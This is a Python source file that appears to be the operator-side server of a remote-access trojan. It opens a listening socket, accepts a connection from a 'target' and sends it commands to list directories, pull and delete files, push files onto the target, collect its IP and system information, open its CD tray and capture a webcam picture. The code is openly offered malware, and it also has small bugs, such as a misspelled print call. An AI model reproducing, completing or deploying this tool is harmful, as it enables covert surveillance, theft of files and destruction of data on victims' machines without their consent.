from datetime import datetime
import os
import socket
import time
import tkinter as tk
import winsound
import pyttsx3 

engine = pyttsx3.init()
s = socket.socket()
host = "192.168.0.4"
port = 4242
my_time = datetime.now()

s.bind((host, port)) 
print(f"Server is runing: {host}")
s.listen(2)
conn, addr = s.accept()
print(f"\n{addr} Has connected to the server in")
print(f"Connection date: {my_time}")

engine.say('Connected to Client')
engine.runAndWait()

print(""" 
Commands aviable now:
    view_cwd                     
    custom_dir
    download_file                
    remove_file
    send_file                    
    get_ip
    open_cd
    beep_it
    sys_info
    get_pic
    """)



while True:
    command = input(str("harun-resit>>"))
    if command == "view_cwd":
        conn.send(command.encode())
        print("")
        print("Command send waiting for execution")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("Command output: ", files)

    elif command == "custom_dir":
        conn.send(command.encode())
        print("")
        user_input = input(str("Custom dir: "))
        conn.send(user_input.encode())
        print("")
        print("Command send waiting for execution")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("Custom dir result: ", files)

    elif command == "download_file":
        conn.send(command.encode())
        filepath = input(str("File directory and file name: "))
        conn.send(filepath.encode())
        file = conn.recv(100000)
        filename = input(str("Please enter a filename for the incoming file the extension: "))
        new_file = open(filename, "wb")
        new_file.write(file)
        new_file.close()
        print("")
        print(filename, " Downloaded...")
        print("")
    elif command == "remove_file":
        conn.send(command.encode())
        fileanddir = input(str("File directry and file name: "))
        conn.send(fileanddir.encode())
        print("File has been removed")
    elif command == "send_file":
        conn.send(command.encode())
        file = input(str("Please enter file name and directory: "))
        filename = input(str("In which name we send the file: "))
        data = open(file, "rb")
        file_data = data.read(7000)
        conn.send(filename.encode())
        print(file, " Has been sended")
        conn.send(file_data)
    elif command == "get_ip":
        conn.send(command.encode())
        ip = conn.recv(2020)
        ip = ip.decode()
        print(f"Target's ip adress: {ip}")
    elif command == "open_cd":
        conn.send(command.encode())
        targets_os = conn.recv(2082)
        targets_os = targets_os.decode()
        if targets_os == "Windows":
            print("Targets OS: ", targets_os)
            print("Cd has opened in the targets machine")
        else:
            not_aviable_txt = conn.recv(3042)
            print(not_aviable_txt.decode())
    elif command == "beep_it":
        prit("This command can not be used now")
    elif command == "sys_info":
        conn.send(command.encode())
        info1 = conn.recv(1024)
        info1 = info1.decode()
        info2 = conn.recv(1026)
        info2 = info2.decode()
        info3 = conn.recv(1028)
        info3 = info3.decode()
        print(info1)
        print(info2)
        print(info3)
    elif command == "get_pic":
        conn.send(command.encode())
        count = 0
        while count <= 100:
            print("Downloading Webcam Picture", count, "%")
            count += 5
            time.sleep(0.75)
        my_pic_data = conn.recv(100000)
        my_pic = open("test.jpg", "wb")
        my_pic.write(my_pic_data)
        my_pic.close()
        print("Webcam Picture Downloaded")
    else:
        print("Error: Command didn't worked!")
